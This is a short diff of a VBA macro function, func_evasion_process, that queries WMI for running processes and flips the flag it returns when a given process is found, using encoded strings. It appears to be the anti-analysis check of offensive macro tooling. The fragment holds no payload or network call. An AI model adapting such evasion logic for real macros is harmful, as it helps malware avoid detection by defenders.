@@ -6,7 +6,7 @@ Function func_evasion_process() As String
 	Dim func_evasion_process1 As String
 	Dim func_evasion_process2 As Object
 	Dim func_evasion_process3 As Object
-	func_evasion_process = "bool1"
+	func_evasion_process = "bool2"
 	
 	Set func_evasion_process2 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
 	Set func_evasion_process3 = func_evasion_process2.ExecQuery(decode("{[SELECT Name FROM Win32_Process]}"))
@@ -14,7 +14,7 @@ Function func_evasion_process() As String
 	func_evasion_process1 = func_evasion_get_process()
 	For Each func_evasion_process4 In func_evasion_process3
 		If LCase(func_evasion_process4.Name) = func_evasion_process1 Then
-			func_evasion_process = "bool2"
+			func_evasion_process = "bool1"
 		End If
 	Next
 End Function
